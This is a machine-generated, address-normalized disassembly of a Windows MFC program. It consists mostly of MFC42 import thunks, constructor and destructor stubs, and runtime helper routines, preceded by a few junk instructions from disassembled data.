movsd [ edi ] [ esi ]
nop
retn
int3
sub_402739
push 0xffffff9a
xchg [ eax - 0x1c030a08 ] dl
clc
cmc
cld
cld
mul ch
hlt
sub_403103
std
into
iretd
sub_40339e
stc
loop rwxdata
jmp ebx
jecxz rwxdata
push esi
in al 0xcc
mul ah
int3
sub_403ea0
mov edx ecx
push edi
mov ecx 0x8
xor eax eax
lea edi [ edx + 0x4 ]
mov [ edx ] rwxdata
[ edi ]
mov [ edx + 0x24 ] ax
mov eax edx
pop edi
retn
sub_403ec0
push esi
mov esi ecx
call sub_403ee0
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_403ee0
mov [ ecx ] rwxdata
retn
sub_403ef0
retn 0x10
sub_404160
push esi
mov esi ecx
call sub_404370
mov eax 0x1
mov [ esi + 0x48 ] 0x2
mov [ esi + 0x18 ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] 0x3
pop esi
retn 0x10
sub_404370
push edi
lea edi [ ecx + 0x4 ]
mov ecx 0x8
xor eax eax
[ edi ]
pop edi
retn
sub_404380
mov eax [ Ordinal_MFC42_4274@IAT ]
retn
sub_404390
mov eax rwxdata
retn
sub_4043a0
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_561
mov [ esi ] rwxdata
mov eax esi
pop esi
retn
sub_4043c0
push esi
mov esi ecx
call sub_4043e0
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4043e0
jmp Ordinal_MFC42_815
sub_4043f0
call sub_404400
jmp sub_404410
sub_404400
mov ecx rwxdata
jmp sub_4043a0
sub_404410
push sub_404420
call sub_40615a
pop ecx
retn
sub_404420
mov ecx rwxdata
jmp sub_4043e0
sub_404590
push esi
push 0x0
mov esi ecx
push 0x64
call Ordinal_MFC42_324
mov [ esi ] rwxdata
mov eax esi
pop esi
retn
sub_4045b0
push esi
mov esi ecx
call sub_4045d0
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4045d0
jmp Ordinal_MFC42_641
sub_4045e0
mov eax [ Ordinal_MFC42_4234@IAT ]
retn
sub_4045f0
mov eax rwxdata
retn
sub_404660
mov eax [ esp + 0x4 ]
push eax
call Ordinal_MFC42_825
pop ecx
retn 0x4
sub_404670
retn
sub_404680
retn 0x4
sub_404690
mov eax [ ecx + 0x20 ]
push 0x0
push eax
call [ EnableWindow@IAT ]
retn
sub_4046a0
mov eax [ ecx + 0x20 ]
push 0x1
push eax
call [ EnableWindow@IAT ]
retn
sub_404710
mov eax [ Ordinal_MFC42_1825@IAT ]
retn
sub_404720
mov eax rwxdata
retn
sub_404730
mov eax [ Ordinal_MFC42_4238@IAT ]
retn
sub_404740
mov eax rwxdata
retn
sub_404750
push esi
mov esi ecx
call Ordinal_MFC42_338
mov [ esi ] rwxdata
mov eax esi
pop esi
retn
sub_404770
push esi
mov esi ecx
call sub_404790
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_404790
mov [ ecx ] rwxdata
jmp Ordinal_MFC42_652
sub_4047a0
call Ordinal_MFC42_4823
neg eax
sbb eax eax
neg eax
retn
sub_4047b0
retn 0x4
sub_4047c0
mov eax [ ecx + 0x48 ]
retn
sub_4047d0
mov eax [ esp + 0x4 ]
mov [ ecx + 0x48 ] eax
retn 0x4
sub_4047e0
jmp rwxdata
retn
sub_404800
call sub_404810
jmp sub_404840
sub_404810
mov ecx rwxdata
jmp sub_404820
sub_404820
push esi
mov esi ecx
call sub_403ea0
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x4
mov eax esi
pop esi
retn
sub_404840
push sub_404850
call sub_40615a
pop ecx
retn
sub_404850
mov ecx rwxdata
jmp j_sub_403ee0
sub_404860
call sub_404870
jmp sub_4048b0
sub_404870
mov ecx rwxdata
jmp sub_404880
sub_404880
push esi
mov esi ecx
call sub_403ea0
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x1
mov eax esi
pop esi
retn
j_sub_403ee0
jmp sub_403ee0
sub_4048b0
push sub_4048c0
call sub_40615a
pop ecx
retn
sub_4048c0
mov ecx rwxdata
jmp j_sub_403ee0
sub_4048d0
call sub_4048e0
jmp sub_404910
sub_4048e0
mov ecx rwxdata
jmp sub_4048f0
sub_4048f0
push esi
mov esi ecx
call sub_403ea0
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x2
mov eax esi
pop esi
retn
sub_404910
push sub_404920
call sub_40615a
pop ecx
retn
sub_404920
mov ecx rwxdata
jmp j_sub_403ee0
sub_404930
call sub_404940
jmp sub_404970
sub_404940
mov ecx rwxdata
jmp sub_404950
sub_404950
push esi
mov esi ecx
call sub_403ea0
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x2
mov eax esi
pop esi
retn
sub_404970
push sub_404980
call sub_40615a
pop ecx
retn
sub_404980
mov ecx rwxdata
jmp j_sub_403ee0
sub_404990
call sub_4049a0
jmp sub_4049f0
sub_4049a0
mov ecx rwxdata
jmp sub_4049b0
sub_4049b0
push esi
mov esi ecx
call sub_403ea0
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x4
mov eax esi
pop esi
retn
sub_4049d0
push esi
mov esi ecx
call j_sub_403ee0
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4049f0
push sub_404a00
call sub_40615a
pop ecx
retn
sub_404a00
mov ecx rwxdata
jmp j_sub_403ee0
sub_404a10
call sub_404a20
jmp sub_404a50
sub_404a20
mov ecx rwxdata
jmp sub_404a30
sub_404a30
push esi
mov esi ecx
call sub_403ea0
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x4
mov eax esi
pop esi
retn
sub_404a50
push sub_404a60
call sub_40615a
pop ecx
retn
sub_404a60
mov ecx rwxdata
jmp j_sub_403ee0
sub_404a70
call sub_404a80
jmp sub_404ab0
sub_404a80
mov ecx rwxdata
jmp sub_404a90
sub_404a90
push esi
mov esi ecx
call sub_403ea0
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x2
mov eax esi
pop esi
retn
sub_404ab0
push sub_404ac0
call sub_40615a
pop ecx
retn
sub_404ac0
mov ecx rwxdata
jmp j_sub_403ee0
sub_404b30
mov eax [ Ordinal_MFC42_1945@IAT ]
retn
sub_404b40
mov eax rwxdata
retn
sub_404b50
mov eax [ Ordinal_MFC42_4273@IAT ]
retn
sub_404b60
mov eax rwxdata
retn
sub_404c70
push esi
mov esi ecx
call sub_404c90
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_404c90
mov [ ecx ] rwxdata
jmp Ordinal_MFC42_813
sub_404ca0
mov eax [ esp + 0x4 ]
push eax
call Ordinal_MFC42_5260
retn 0x4
sub_405270
mov eax [ esp + 0x4 ]
push eax
call Ordinal_MFC42_2535
retn 0x4
sub_405280
retn 0x8
sub_4056a0
mov eax 0x1
retn 0x4
sub_405720
mov [ ecx ] rwxdata
retn
sub_405730
push esi
mov esi ecx
call sub_405750
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4057a0
push esi
mov esi ecx
call sub_4057c0
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_405810
push esi
mov esi ecx
call sub_405830
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_405880
push esi
mov esi ecx
call sub_4058a0
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_405950
mov eax [ Ordinal_MFC42_1842@IAT ]
retn
sub_405960
mov eax rwxdata
retn
sub_405970
mov eax [ Ordinal_MFC42_4242@IAT ]
retn
sub_405980
mov eax rwxdata
retn
sub_4059f0
push esi
mov esi ecx
call sub_405a10
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
Ordinal_MFC42_825
jmp [ Ordinal_MFC42_825@IAT ]
Ordinal_MFC42_4615
jmp [ Ordinal_MFC42_4615@IAT ]
Ordinal_MFC42_4612
jmp [ Ordinal_MFC42_4612@IAT ]
Ordinal_MFC42_4610
jmp [ Ordinal_MFC42_4610@IAT ]
Ordinal_MFC42_6375
jmp [ Ordinal_MFC42_6375@IAT ]
Ordinal_MFC42_4486
jmp [ Ordinal_MFC42_4486@IAT ]
Ordinal_MFC42_2554
jmp [ Ordinal_MFC42_2554@IAT ]
Ordinal_MFC42_2512
jmp [ Ordinal_MFC42_2512@IAT ]
Ordinal_MFC42_5731
jmp [ Ordinal_MFC42_5731@IAT ]
Ordinal_MFC42_3922
jmp [ Ordinal_MFC42_3922@IAT ]
Ordinal_MFC42_1089
jmp [ Ordinal_MFC42_1089@IAT ]
Ordinal_MFC42_5199
jmp [ Ordinal_MFC42_5199@IAT ]
Ordinal_MFC42_2396
jmp [ Ordinal_MFC42_2396@IAT ]
Ordinal_MFC42_3346
jmp [ Ordinal_MFC42_3346@IAT ]
Ordinal_MFC42_5300
jmp [ Ordinal_MFC42_5300@IAT ]
Ordinal_MFC42_5302
jmp [ Ordinal_MFC42_5302@IAT ]
Ordinal_MFC42_2725
jmp [ Ordinal_MFC42_2725@IAT ]
Ordinal_MFC42_4079
jmp [ Ordinal_MFC42_4079@IAT ]
Ordinal_MFC42_4698
jmp [ Ordinal_MFC42_4698@IAT ]
Ordinal_MFC42_5307
jmp [ Ordinal_MFC42_5307@IAT ]
Ordinal_MFC42_5289
jmp [ Ordinal_MFC42_5289@IAT ]
Ordinal_MFC42_5714
jmp [ Ordinal_MFC42_5714@IAT ]
Ordinal_MFC42_2982
jmp [ Ordinal_MFC42_2982@IAT ]
Ordinal_MFC42_3147
jmp [ Ordinal_MFC42_3147@IAT ]
Ordinal_MFC42_3259
jmp [ Ordinal_MFC42_3259@IAT ]
Ordinal_MFC42_4465
jmp [ Ordinal_MFC42_4465@IAT ]
Ordinal_MFC42_3136
jmp [ Ordinal_MFC42_3136@IAT ]
Ordinal_MFC42_3262
jmp [ Ordinal_MFC42_3262@IAT ]
Ordinal_MFC42_2985
jmp [ Ordinal_MFC42_2985@IAT ]
Ordinal_MFC42_3081
jmp [ Ordinal_MFC42_3081@IAT ]
Ordinal_MFC42_2976
jmp [ Ordinal_MFC42_2976@IAT ]
Ordinal_MFC42_3830
jmp [ Ordinal_MFC42_3830@IAT ]
Ordinal_MFC42_3831
jmp [ Ordinal_MFC42_3831@IAT ]
Ordinal_MFC42_3825
jmp [ Ordinal_MFC42_3825@IAT ]
Ordinal_MFC42_3079
jmp [ Ordinal_MFC42_3079@IAT ]
Ordinal_MFC42_4080
jmp [ Ordinal_MFC42_4080@IAT ]
Ordinal_MFC42_4622
jmp [ Ordinal_MFC42_4622@IAT ]
Ordinal_MFC42_4424
jmp [ Ordinal_MFC42_4424@IAT ]
Ordinal_MFC42_3738
jmp [ Ordinal_MFC42_3738@IAT ]
Ordinal_MFC42_561
jmp [ Ordinal_MFC42_561@IAT ]
Ordinal_MFC42_815
jmp [ Ordinal_MFC42_815@IAT ]
Ordinal_MFC42_6215
jmp [ Ordinal_MFC42_6215@IAT ]
Ordinal_MFC42_617
jmp [ Ordinal_MFC42_617@IAT ]
Ordinal_MFC42_5301
jmp [ Ordinal_MFC42_5301@IAT ]
Ordinal_MFC42_5214
jmp [ Ordinal_MFC42_5214@IAT ]
Ordinal_MFC42_296
jmp [ Ordinal_MFC42_296@IAT ]
Ordinal_MFC42_986
jmp [ Ordinal_MFC42_986@IAT ]
Ordinal_MFC42_520
jmp [ Ordinal_MFC42_520@IAT ]
Ordinal_MFC42_823
jmp [ Ordinal_MFC42_823@IAT ]
Ordinal_MFC42_4159
jmp [ Ordinal_MFC42_4159@IAT ]
Ordinal_MFC42_6117
jmp [ Ordinal_MFC42_6117@IAT ]
Ordinal_MFC42_2621
jmp [ Ordinal_MFC42_2621@IAT ]
Ordinal_MFC42_1134
jmp [ Ordinal_MFC42_1134@IAT ]
Ordinal_MFC42_5265
jmp [ Ordinal_MFC42_5265@IAT ]
Ordinal_MFC42_4376
jmp [ Ordinal_MFC42_4376@IAT ]
Ordinal_MFC42_4853
jmp [ Ordinal_MFC42_4853@IAT ]
Ordinal_MFC42_4998
jmp [ Ordinal_MFC42_4998@IAT ]
Ordinal_MFC42_4710
jmp [ Ordinal_MFC42_4710@IAT ]
Ordinal_MFC42_2514
jmp [ Ordinal_MFC42_2514@IAT ]
Ordinal_MFC42_6052
jmp [ Ordinal_MFC42_6052@IAT ]
Ordinal_MFC42_4078
jmp [ Ordinal_MFC42_4078@IAT ]
Ordinal_MFC42_1775
jmp [ Ordinal_MFC42_1775@IAT ]
Ordinal_MFC42_4407
jmp [ Ordinal_MFC42_4407@IAT ]
Ordinal_MFC42_5241
jmp [ Ordinal_MFC42_5241@IAT ]
Ordinal_MFC42_2385
jmp [ Ordinal_MFC42_2385@IAT ]
Ordinal_MFC42_5163
jmp [ Ordinal_MFC42_5163@IAT ]
Ordinal_MFC42_6374
jmp [ Ordinal_MFC42_6374@IAT ]
Ordinal_MFC42_4353
jmp [ Ordinal_MFC42_4353@IAT ]
Ordinal_MFC42_5280
jmp [ Ordinal_MFC42_5280@IAT ]
Ordinal_MFC42_3798
jmp [ Ordinal_MFC42_3798@IAT ]
Ordinal_MFC42_4837
jmp [ Ordinal_MFC42_4837@IAT ]
Ordinal_MFC42_4441
jmp [ Ordinal_MFC42_4441@IAT ]
Ordinal_MFC42_2648
jmp [ Ordinal_MFC42_2648@IAT ]
Ordinal_MFC42_2055
jmp [ Ordinal_MFC42_2055@IAT ]
Ordinal_MFC42_6376
jmp [ Ordinal_MFC42_6376@IAT ]
Ordinal_MFC42_3749
jmp [ Ordinal_MFC42_3749@IAT ]
Ordinal_MFC42_5065
jmp [ Ordinal_MFC42_5065@IAT ]
Ordinal_MFC42_1727
jmp [ Ordinal_MFC42_1727@IAT ]
Ordinal_MFC42_5261
jmp [ Ordinal_MFC42_5261@IAT ]
Ordinal_MFC42_2446
jmp [ Ordinal_MFC42_2446@IAT ]
Ordinal_MFC42_2124
jmp [ Ordinal_MFC42_2124@IAT ]
Ordinal_MFC42_5277
jmp [ Ordinal_MFC42_5277@IAT ]
Ordinal_MFC42_4627
jmp [ Ordinal_MFC42_4627@IAT ]
Ordinal_MFC42_4425
jmp [ Ordinal_MFC42_4425@IAT ]
Ordinal_MFC42_3597
jmp [ Ordinal_MFC42_3597@IAT ]
Ordinal_MFC42_324
jmp [ Ordinal_MFC42_324@IAT ]
Ordinal_MFC42_641
jmp [ Ordinal_MFC42_641@IAT ]
Ordinal_MFC42_4696
jmp [ Ordinal_MFC42_4696@IAT ]
Ordinal_MFC42_3058
jmp [ Ordinal_MFC42_3058@IAT ]
Ordinal_MFC42_3065
jmp [ Ordinal_MFC42_3065@IAT ]
Ordinal_MFC42_6336
jmp [ Ordinal_MFC42_6336@IAT ]
Ordinal_MFC42_2510
jmp [ Ordinal_MFC42_2510@IAT ]
Ordinal_MFC42_2542
jmp [ Ordinal_MFC42_2542@IAT ]
Ordinal_MFC42_5243
jmp [ Ordinal_MFC42_5243@IAT ]
Ordinal_MFC42_5740
jmp [ Ordinal_MFC42_5740@IAT ]
Ordinal_MFC42_1746
jmp [ Ordinal_MFC42_1746@IAT ]
Ordinal_MFC42_5577
jmp [ Ordinal_MFC42_5577@IAT ]
Ordinal_MFC42_3172
jmp [ Ordinal_MFC42_3172@IAT ]
Ordinal_MFC42_5653
jmp [ Ordinal_MFC42_5653@IAT ]
Ordinal_MFC42_4420
jmp [ Ordinal_MFC42_4420@IAT ]
Ordinal_MFC42_4953
jmp [ Ordinal_MFC42_4953@IAT ]
Ordinal_MFC42_4858
jmp [ Ordinal_MFC42_4858@IAT ]
Ordinal_MFC42_2399
jmp [ Ordinal_MFC42_2399@IAT ]
Ordinal_MFC42_4387
jmp [ Ordinal_MFC42_4387@IAT ]
Ordinal_MFC42_3454
jmp [ Ordinal_MFC42_3454@IAT ]
Ordinal_MFC42_3198
jmp [ Ordinal_MFC42_3198@IAT ]
Ordinal_MFC42_6080
jmp [ Ordinal_MFC42_6080@IAT ]
Ordinal_MFC42_6175
jmp [ Ordinal_MFC42_6175@IAT ]
Ordinal_MFC42_4623
jmp [ Ordinal_MFC42_4623@IAT ]
Ordinal_MFC42_4426
jmp [ Ordinal_MFC42_4426@IAT ]
Ordinal_MFC42_338
jmp [ Ordinal_MFC42_338@IAT ]
Ordinal_MFC42_652
jmp [ Ordinal_MFC42_652@IAT ]
Ordinal_MFC42_4823
jmp [ Ordinal_MFC42_4823@IAT ]
Ordinal_MFC42_4614
jmp [ Ordinal_MFC42_4614@IAT ]
Ordinal_MFC42_4613
jmp [ Ordinal_MFC42_4613@IAT ]
Ordinal_MFC42_4589
jmp [ Ordinal_MFC42_4589@IAT ]
Ordinal_MFC42_4899
jmp [ Ordinal_MFC42_4899@IAT ]
Ordinal_MFC42_5076
jmp [ Ordinal_MFC42_5076@IAT ]
Ordinal_MFC42_4341
jmp [ Ordinal_MFC42_4341@IAT ]
Ordinal_MFC42_4349
jmp [ Ordinal_MFC42_4349@IAT ]
Ordinal_MFC42_4723
jmp [ Ordinal_MFC42_4723@IAT ]
Ordinal_MFC42_4890
jmp [ Ordinal_MFC42_4890@IAT ]
Ordinal_MFC42_4531
jmp [ Ordinal_MFC42_4531@IAT ]
Ordinal_MFC42_4545
jmp [ Ordinal_MFC42_4545@IAT ]
Ordinal_MFC42_4543
jmp [ Ordinal_MFC42_4543@IAT ]
Ordinal_MFC42_4526
jmp [ Ordinal_MFC42_4526@IAT ]
Ordinal_MFC42_4529
jmp [ Ordinal_MFC42_4529@IAT ]
Ordinal_MFC42_4524
jmp [ Ordinal_MFC42_4524@IAT ]
Ordinal_MFC42_4964
jmp [ Ordinal_MFC42_4964@IAT ]
Ordinal_MFC42_4961
jmp [ Ordinal_MFC42_4961@IAT ]
Ordinal_MFC42_4108
jmp [ Ordinal_MFC42_4108@IAT ]
Ordinal_MFC42_6055
jmp [ Ordinal_MFC42_6055@IAT ]
Ordinal_MFC42_1776
jmp [ Ordinal_MFC42_1776@IAT ]
Ordinal_MFC42_5240
jmp [ Ordinal_MFC42_5240@IAT ]
Ordinal_MFC42_5290
jmp [ Ordinal_MFC42_5290@IAT ]
Ordinal_MFC42_3748
jmp [ Ordinal_MFC42_3748@IAT ]
Ordinal_MFC42_1726
jmp [ Ordinal_MFC42_1726@IAT ]
Ordinal_MFC42_4432
jmp [ Ordinal_MFC42_4432@IAT ]
Ordinal_MFC42_560
jmp [ Ordinal_MFC42_560@IAT ]
Ordinal_MFC42_813
jmp [ Ordinal_MFC42_813@IAT ]
Ordinal_MFC42_5260
jmp [ Ordinal_MFC42_5260@IAT ]
Ordinal_MFC42_3663
jmp [ Ordinal_MFC42_3663@IAT ]
Ordinal_MFC42_3571
jmp [ Ordinal_MFC42_3571@IAT ]
Ordinal_MFC42_3573
jmp [ Ordinal_MFC42_3573@IAT ]
Ordinal_MFC42_3693
jmp [ Ordinal_MFC42_3693@IAT ]
Ordinal_MFC42_3626
jmp [ Ordinal_MFC42_3626@IAT ]
Ordinal_MFC42_640
jmp [ Ordinal_MFC42_640@IAT ]
Ordinal_MFC42_2405
jmp [ Ordinal_MFC42_2405@IAT ]
Ordinal_MFC42_2414
jmp [ Ordinal_MFC42_2414@IAT ]
Ordinal_MFC42_5787
jmp [ Ordinal_MFC42_5787@IAT ]
Ordinal_MFC42_5788
jmp [ Ordinal_MFC42_5788@IAT ]
Ordinal_MFC42_2753
jmp [ Ordinal_MFC42_2753@IAT ]
Ordinal_MFC42_5785
jmp [ Ordinal_MFC42_5785@IAT ]
Ordinal_MFC42_1641
jmp [ Ordinal_MFC42_1641@IAT ]
Ordinal_MFC42_1640
jmp [ Ordinal_MFC42_1640@IAT ]
Ordinal_MFC42_323
jmp [ Ordinal_MFC42_323@IAT ]
Ordinal_MFC42_2535
jmp [ Ordinal_MFC42_2535@IAT ]
Ordinal_MFC42_2379
jmp [ Ordinal_MFC42_2379@IAT ]
Ordinal_MFC42_4464
jmp [ Ordinal_MFC42_4464@IAT ]
Ordinal_MFC42_2723
jmp [ Ordinal_MFC42_2723@IAT ]
Ordinal_MFC42_2390
jmp [ Ordinal_MFC42_2390@IAT ]
Ordinal_MFC42_3059
jmp [ Ordinal_MFC42_3059@IAT ]
Ordinal_MFC42_5100
jmp [ Ordinal_MFC42_5100@IAT ]
Ordinal_MFC42_5103
jmp [ Ordinal_MFC42_5103@IAT ]
Ordinal_MFC42_4467
jmp [ Ordinal_MFC42_4467@IAT ]
Ordinal_MFC42_4303
jmp [ Ordinal_MFC42_4303@IAT ]
Ordinal_MFC42_3350
jmp [ Ordinal_MFC42_3350@IAT ]
Ordinal_MFC42_5012
jmp [ Ordinal_MFC42_5012@IAT ]
Ordinal_MFC42_975
jmp [ Ordinal_MFC42_975@IAT ]
Ordinal_MFC42_5472
jmp [ Ordinal_MFC42_5472@IAT ]
Ordinal_MFC42_3403
jmp [ Ordinal_MFC42_3403@IAT ]
Ordinal_MFC42_2879
jmp [ Ordinal_MFC42_2879@IAT ]
Ordinal_MFC42_2878
jmp [ Ordinal_MFC42_2878@IAT ]
Ordinal_MFC42_4151
jmp [ Ordinal_MFC42_4151@IAT ]
Ordinal_MFC42_4077
jmp [ Ordinal_MFC42_4077@IAT ]
Ordinal_MFC42_5237
jmp [ Ordinal_MFC42_5237@IAT ]
Ordinal_MFC42_5282
jmp [ Ordinal_MFC42_5282@IAT ]
Ordinal_MFC42_2649
jmp [ Ordinal_MFC42_2649@IAT ]
Ordinal_MFC42_1665
jmp [ Ordinal_MFC42_1665@IAT ]
Ordinal_MFC42_4436
jmp [ Ordinal_MFC42_4436@IAT ]
Ordinal_MFC42_4427
jmp [ Ordinal_MFC42_4427@IAT ]
Ordinal_MFC42_796
jmp [ Ordinal_MFC42_796@IAT ]
Ordinal_MFC42_674
jmp [ Ordinal_MFC42_674@IAT ]
Ordinal_MFC42_554
jmp [ Ordinal_MFC42_554@IAT ]
Ordinal_MFC42_529
jmp [ Ordinal_MFC42_529@IAT ]
Ordinal_MFC42_366
jmp [ Ordinal_MFC42_366@IAT ]
Ordinal_MFC42_807
jmp [ Ordinal_MFC42_807@IAT ]
Ordinal_MFC42_2494
jmp [ Ordinal_MFC42_2494@IAT ]
Ordinal_MFC42_2627
jmp [ Ordinal_MFC42_2627@IAT ]
Ordinal_MFC42_2626
jmp [ Ordinal_MFC42_2626@IAT ]
Ordinal_MFC42_6000
jmp [ Ordinal_MFC42_6000@IAT ]
Ordinal_MFC42_2117
jmp [ Ordinal_MFC42_2117@IAT ]
Ordinal_MFC42_4163
jmp [ Ordinal_MFC42_4163@IAT ]
Ordinal_MFC42_6625
jmp [ Ordinal_MFC42_6625@IAT ]
Ordinal_MFC42_4457
jmp [ Ordinal_MFC42_4457@IAT ]
Ordinal_MFC42_5252
jmp [ Ordinal_MFC42_5252@IAT ]
Ordinal_MFC42_4284
jmp [ Ordinal_MFC42_4284@IAT ]
sub_40612e
cmp [ rwxdata ] 0xffffffff
jne rwxdata
push rwxdata
push rwxdata
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_40615a
push [ esp + 0x4 ]
call sub_40612e
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_4062f6
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_406308
xor eax eax
retn
sub_40630b
retn
_controlfp
jmp [ _controlfp@IAT ]
sub_406312
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call Ordinal_MFC42_1576
retn 0x10
j_sub_406358
jmp sub_406358
sub_406358
push 0x600
push 0x0
call sub_40632a
mov [ rwxdata ] al
retn
Ordinal_MFC42_1576
jmp [ Ordinal_MFC42_1576@IAT ]
Ordinal_MFC42_1168
jmp [ Ordinal_MFC42_1168@IAT ]
sub_406380
mov eax [ ebp - 0x138 ]
push eax
call sub_404660
retn
sub_40638d
lea ecx [ ebp - 0x134 ]
jmp Ordinal_MFC42_617
sub_406398
mov eax rwxdata
jmp __CxxFrameHandler
sub_4063b0
lea ecx [ ebp - 0x6c ]
jmp sub_4045d0
sub_4063b8
mov eax rwxdata
jmp __CxxFrameHandler
sub_4063d0
mov eax [ ebp - 0x10 ]
push eax
call sub_404660
retn
sub_4063da
mov eax rwxdata
jmp __CxxFrameHandler
sub_4063f0
mov eax [ ebp - 0x10 ]
push eax
call sub_404660
retn
sub_4063fa
mov eax rwxdata
jmp __CxxFrameHandler
sub_406410
lea ecx [ ebp - 0x3c ]
jmp sub_4058a0
sub_406418
lea ecx [ ebp - 0x1c ]
jmp Ordinal_MFC42_640
sub_406420
lea ecx [ ebp - 0x44 ]
jmp sub_4057c0
sub_406428
lea ecx [ ebp - 0x4c ]
jmp sub_405830
sub_406430
lea ecx [ ebp - 0x24 ]
jmp sub_405830
sub_406438
lea ecx [ ebp - 0x2c ]
jmp sub_405830
sub_406440
lea ecx [ ebp - 0x34 ]
jmp sub_405830
sub_406448
lea ecx [ ebp - 0x34 ]
jmp sub_405720
sub_406450
lea ecx [ ebp - 0x2c ]
jmp sub_405720
sub_406458
lea ecx [ ebp - 0x24 ]
jmp sub_405720
sub_406460
lea ecx [ ebp - 0x4c ]
jmp sub_405720
sub_406468
lea ecx [ ebp - 0x44 ]
jmp sub_405720
sub_406470
lea ecx [ ebp - 0x3c ]
jmp sub_405720
sub_406478
mov eax rwxdata
jmp __CxxFrameHandler
sub_406490
mov ecx [ ebp - 0x10 ]
jmp sub_405720
sub_406498
mov eax rwxdata
jmp __CxxFrameHandler
sub_4064b0
mov ecx [ ebp - 0x10 ]
jmp sub_405720
sub_4064b8
mov eax rwxdata
jmp __CxxFrameHandler
sub_4064d0
mov ecx [ ebp - 0x10 ]
jmp sub_405720
sub_4064d8
mov eax rwxdata
jmp __CxxFrameHandler
sub_4064f0
mov ecx [ ebp - 0x10 ]
jmp sub_405720
sub_4064f8
mov eax rwxdata
jmp __CxxFrameHandler
sub_406510
mov eax [ ebp - 0x10 ]
push eax
call sub_404660
retn
sub_40651a
mov eax rwxdata
jmp __CxxFrameHandler
sub_406530
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_674
sub_406538
mov ecx [ ebp - 0x10 ]
add ecx 0xc0
jmp Ordinal_MFC42_796
sub_406546
mov eax rwxdata
jmp __CxxFrameHandler
sub_406550
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_674
sub_406558
mov ecx [ ebp - 0x10 ]
add ecx 0xc0
jmp Ordinal_MFC42_796
sub_406566
mov eax rwxdata
jmp __CxxFrameHandler
